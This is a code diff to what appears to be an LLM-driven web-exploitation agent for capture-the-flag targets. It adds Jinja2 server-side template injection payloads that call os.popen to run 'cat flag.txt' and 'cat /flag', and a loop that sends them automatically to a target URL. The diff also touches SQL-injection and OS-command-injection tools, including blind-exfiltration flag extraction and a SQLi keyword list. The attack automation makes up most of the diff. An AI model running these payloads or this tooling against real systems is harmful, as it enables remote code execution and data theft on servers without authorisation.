@@ -38,6 +38,44 @@ SMART_LOGIC_WORDLIST = [
   "' OR", "' AND", "' UNION", "' SELECT--", "';--",
 ]
 
+FLAG_TOKEN_RE = re.compile(r"\b(?:FLAG|flag|XBEN)\{[^}\s]{1,200}\}", re.IGNORECASE)
+
+
+def _extract_real_flag_token(text: str) -> str:
+    if not text:
+        return ""
+    match = FLAG_TOKEN_RE.search(str(text))
+    return match.group(0) if match else ""
+
+
+def _extract_engine_hint_from_strategy(strategy: str) -> str:
+    text = str(strategy or "").lower()
+    if "django" in text:
+        return "django"
+    if "jinja" in text or "flask" in text:
+        return "jinja"
+    if "twig" in text:
+        return "twig"
+    return "unknown"
+
+
+def _build_ssti_deterministic_payloads(engine_hint: str) -> list[tuple[str, str]]:
+    payloads: list[tuple[str, str]] = []
+    payloads.extend([
+        ("{{flag}}", "context variable flag rendered directly"),
+        ("{{ flag }}", "context variable flag rendered directly with spacing"),
+    ])
+    if engine_hint in {"jinja", "unknown"}:
+        payloads.extend([
+            ("{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}", "read flag.txt via config globals"),
+            ("{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}", "read flag.txt via cycler globals"),
+            ("{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}", "read flag.txt via lipsum globals"),
+            ("{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}", "read /flag via config globals"),
+            ("{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}", "read /flag via cycler globals"),
+        ])
+    return payloads
+
+
 # ========== HELPER FUNCTIONS ==========
 
 def _parse_smart_curl_output(output: str):
@@ -546,7 +584,7 @@ class SmartSQLiInput(BaseModel):
     body: str = Field(..., description="Request body with INJECTION placeholder (e.g., 'username=INJECTION&password=test')")
     goal: str = Field(..., description="Goal of the attack (e.g., 'Bypass login', 'Leak database name', 'Extract password')")
     body_type: str = Field(default="form", description="Body type: form, json, xml")
-    max_attempts: int = Field(default=25, description="Maximum number of iterations")
+    max_attempts: int = Field(default=10, description="Maximum number of iterations")
     headers: Optional[Dict] = Field(default=None, description="Custom HTTP headers")
     cookies: Optional[Dict] = Field(default=None, description="HTTP cookies")
 
@@ -571,8 +609,8 @@ def check_flag(res):
 
     return False
 
-@tool(args_schema=SmartSQLiInput)
-async def SmartSQLiTool(url, goal, body, method="GET", body_type="form", max_attempts=25, headers=None, cookies=None):
+@tool(args_schema=SmartSQLiInput, return_direct=True)
+async def SmartSQLiTool(url, goal, body, method="GET", body_type="form", max_attempts=10, headers=None, cookies=None):
     """SQLi Injection automation"""
     context = {
         "goal": goal,
@@ -758,7 +796,7 @@ class SmartCodeInjectionInput(BaseModel):
     headers: Optional[Dict] = Field(default=None, description="Custom HTTP headers")
     cookies: Optional[Dict] = Field(default=None, description="HTTP cookies")
 
-@tool(args_schema=SmartCodeInjectionInput)
+@tool(args_schema=SmartCodeInjectionInput, return_direct=True)
 async def SmartCodeInjectionTool(url, body, baseline, method="GET", attack_type="OS_Command_Linux", body_type="form", headers=None, cookies=None):
     """Forensic Code Injection tool. Tests for OS Command Injection (Linux) and Server-Side Template Injection (SSTI) vulnerabilities. Agent-driven detection with automatic payload generation and result analysis."""
     if attack_type == "OS_Command_Linux":
@@ -838,7 +876,25 @@ async def OSCommandInjectionTool(url, body, baseline, method="GET", body_type="f
     strategy = (await llm.ainvoke(analyzer_prompt)).content
     print(f"--- Strategy ---\n{strategy}\n")
     context["current_strategy"] = strategy
-    
+
+    # [STEP 2.5] DETERMINISTIC IMMEDIATE-SINK FALLBACKS
+    print("\n[STEP 2.5] DETERMINISTIC SSTI FALLBACKS")
+    engine_hint = _extract_engine_hint_from_strategy(strategy)
+    for payload, expectation in _build_ssti_deterministic_payloads(engine_hint):
+        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Deterministic")
+        context["history"].append({
+            "payload": payload,
+            "status": res["status"],
+            "length": res["length"],
+            "duration": res["duration"],
+            "body": res["body"],
+            "expectation": expectation
+        })
+        response_flag = _extract_real_flag_token(res["body"])
+        if response_flag:
+            print(f"\n🎯 GOAL REACHED! Deterministic payload succeeded: {payload}")
+            return f"✅ SUCCESS: {goal}\nPayload: {payload}\nResponse: {res['body']}"
+
     # [STEP 3] REFLECTION LOOP - Generate and test payloads
     print("\n[STEP 3] EXPLOITATION LOOP")
     for i in range(max_attempts):
@@ -915,16 +971,23 @@ Provide brief analysis.
                 context["baseline"]["duration"]
             )
             
-            if extracted_flag:
+            normalized_exfil = _normalize_blind_exfil_output(extracted_flag)
+            extracted_flag_token = _extract_real_flag_token(normalized_exfil)
+            if extracted_flag_token:
                 print(f"\n🎯 GOAL REACHED (Blind Exfil)!")
-                return f"✅ SUCCESS: {goal}\nExtracted Flag: {extracted_flag}"
+                return f"✅ SUCCESS: {goal}\nExtracted Flag: {extracted_flag_token}"
+            if normalized_exfil:
+                print("   [!] Automated exfiltration produced non-flag output; continuing manual exploitation.")
             else:
                 print("   [!] Automated exfiltration failed. Retrying manually...")
 
         # Check for success
-        if "<VERDICT>SUCCESS</VERDICT>" in reflection.upper() or "flag{" in res["body"].lower():
+        response_flag = _extract_real_flag_token(res["body"])
+        if response_flag:
             print(f"\n🎯 GOAL REACHED!")
             return f"✅ SUCCESS: {goal}\nPayload: {payload}\nResponse: {res['body']}"
+        if "<VERDICT>SUCCESS</VERDICT>" in reflection.upper():
+            print("   [!] Reflection claimed SUCCESS without literal flag evidence; continuing.")
         
         # Update strategy based on reflection
         context["current_strategy"] += f"\n\nIteration {i+1} reflection: {reflection}"
